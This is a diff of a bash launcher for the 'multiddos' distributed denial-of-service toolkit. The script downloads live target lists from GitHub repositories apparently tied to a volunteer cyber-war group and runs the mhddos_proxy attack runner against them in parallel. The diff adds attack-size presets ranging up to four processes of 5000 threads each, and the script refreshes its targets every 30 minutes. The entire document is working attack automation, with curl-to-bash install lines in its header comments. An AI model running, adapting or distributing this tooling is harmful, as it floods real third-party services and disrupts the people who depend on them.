@@ -1,12 +1,18 @@
 #!/bin/bash
 # curl -LO tiny.one/multiddos && bash multiddos
 # curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh
-clear && echo -e "Loading... v1.0\n"
+clear && echo -e "Loading... v1.1\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
 sudo apt-get install -q -y tmux jq git toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
-pkill -f start.py; pkill -f runner.py; #stop old processes if they still running
 rm -rf ~/multidd*; mkdir -p ~/multidd/targets/ ; cd ~/multidd # clean working folder 
+
+gotop="on"
+db1000n="off"
+vnstat="off"
+proxy_finder="off"
+export methods="--http-methods GET STRESS"
+export ddos_size="L"
 
 # create swap file if system doesn't have it. Helps systems with very little RAM.
 if [[ $(echo $(swapon --noheadings --bytes | cut -d " " -f3)) == "" ]]; then
@@ -23,17 +29,6 @@ typing_on_screen (){
 }
 export -f typing_on_screen
 
-#if launched in docker than variables saved in docker md.sh will be used
-if [[ $docker_mode != "true" ]]; then
-    gotop="on"
-    db1000n="off"
-    vnstat="off"
-    proxy_finder="off"
-fi
-
-if [[ $t_set_manual != "on" ]]; then export threads="-t 2500"; fi # default threads if not passed in cmd line
-if [[ $t_proxy_manual != "on" ]]; then export proxy_threads="2000"; fi # default proxy_threads if not passed in cmd line
-
 ### prepare target files and show banner
 prepare_targets_and_banner () {
 rm -rf ~/multidd/targets/*
@@ -42,7 +37,10 @@ rm -rf ~/multidd/targets/*
 echo "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/all.txt)" > ~/multidd/targets/source1.txt
 # 2 IT ARMY of Ukraine                             https://t.me/itarmyofukraine2022
 echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.request.path')" > ~/multidd/targets/source2.txt
-echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.client.static_host.addr')" > ~/multidd/targets/source3.txt
+echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.client.static_host.addr | select (. != null)')" > ~/multidd/targets/source3.txt
+
+# add 'tcp://' to all ip addresses
+sed -i -e 's/^/tcp:\/\//g' ~/multidd/targets/source3.txt
 
 # skip wrong lines in sources (those happens) and combine all sources together in single file all_targets.txt
 cat ~/multidd/targets/source* | while read LINE; do
@@ -80,10 +78,10 @@ if [[ $gotop == "on" ]]; then
         curl -L https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb -o gotop.deb
         sudo dpkg -i gotop.deb
     fi
-    tmux new-session -s multiddos -d 'gotop -sc solarized'
+    tmux new-session -s multidd -d 'gotop -sc solarized'
     tmux split-window -h -p 66 'bash auto_bash.sh'
 else
-    tmux new-session -s multiddos -d 'bash auto_bash.sh'
+    tmux new-session -s multidd -d 'bash auto_bash.sh'
 fi
 
 if [[ $vnstat == "on" ]]; then
@@ -107,8 +105,12 @@ while [ "$1" != "" ]; do
         +d | --db1000n )   db1000n="on"; shift ;;
         -g | --gotop ) gotop="off"; db1000n="off"; shift ;;
         +v | --vnstat ) vnstat="on"; shift ;;
-        --lite ) export lite="on"; shift ;;
-        --plite ) export lite="on"; export proxy_threads=1000; shift ;;
+        --XS ) export ddos_size="XS"; shift ;;
+        --S | --lite ) export ddos_size="S"; shift ;;
+        --M ) export ddos_size="M"; shift ;;
+        --L ) export ddos_size="L"; shift ;;
+        --XL ) export ddos_size="XL"; shift ;;
+        --XXL ) export ddos_size="XXL"; shift ;;
         -p | --proxy-threads ) export proxy_finder="on"; export proxy_threads="$2"; shift 2 ;;
         *   ) export args_to_pass+=" $1"; shift ;; #pass all unrecognized arguments to mhddos_proxy
     esac
@@ -127,16 +129,34 @@ while true; do
     cd ~/multidd/mhddos_proxy
     python3 -m pip install -r requirements.txt
 
-    if [[ $lite == "on" ]]; then
+    if [[ $ddos_size == "XS" ]]; then
         tail -n 1000 ~/multidd/targets/uniq_targets.txt > ~/multidd/targets/lite_targets.txt
-        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/lite_targets.txt $methods $args_to_pass -t 2000 &
-    else
-        cd ~/multidd/targets/; split -n l/4 --additional-suffix=.uaripper ~/multidd/targets/uniq_targets.txt; cd ~/multidd/mhddos_proxy #split targets in N parts
-        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xaa.uaripper $methods $threads $args_to_pass &
-        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xab.uaripper $methods $threads $args_to_pass &
-        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xac.uaripper $methods $threads $args_to_pass &
-        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xad.uaripper $methods $threads $args_to_pass &
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/lite_targets.txt $methods -t 1000 $args_to_pass &
+    elif [[ $ddos_size == "S" ]]; then
+        tail -n 1000 ~/multidd/targets/uniq_targets.txt > ~/multidd/targets/lite_targets.txt
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/lite_targets.txt $methods -t 2000 $args_to_pass &
+    elif [[ $ddos_size == "M" ]]; then
+        cd ~/multidd/targets/; split -n l/2 --additional-suffix=.uaripper ~/multidd/targets/uniq_targets.txt; cd ~/multidd/mhddos_proxy #split targets in 2 parts
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xaa.uaripper $methods -t 2000 $args_to_pass &
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xab.uaripper $methods -t 2000 $args_to_pass &
+    elif [[ $ddos_size == "L" ]]; then
+        cd ~/multidd/targets/; split -n l/2 --additional-suffix=.uaripper ~/multidd/targets/uniq_targets.txt; cd ~/multidd/mhddos_proxy #split targets in 2 parts
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xaa.uaripper $methods -t 4000 $args_to_pass &
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xab.uaripper $methods -t 4000 $args_to_pass &
+    elif [[ $ddos_size == "XL" ]]; then
+        cd ~/multidd/targets/; split -n l/4 --additional-suffix=.uaripper ~/multidd/targets/uniq_targets.txt; cd ~/multidd/mhddos_proxy #split targets in 4 parts
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xaa.uaripper $methods -t 2500 $args_to_pass &
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xab.uaripper $methods -t 2500 $args_to_pass &
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xac.uaripper $methods -t 2500 $args_to_pass &
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xad.uaripper $methods -t 2500 $args_to_pass &
+    elif [[ $ddos_size == "XXL" ]]; then
+        cd ~/multidd/targets/; split -n l/4 --additional-suffix=.uaripper ~/multidd/targets/uniq_targets.txt; cd ~/multidd/mhddos_proxy #split targets in 2 parts
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xaa.uaripper $methods -t 5000 $args_to_pass &
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xab.uaripper $methods -t 5000 $args_to_pass &
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xac.uaripper $methods -t 5000 $args_to_pass &
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xad.uaripper $methods -t 5000 $args_to_pass &
     fi
+    
 sleep 30m
 pkill -f start.py; pkill -f runner.py;
 prepare_targets_and_banner
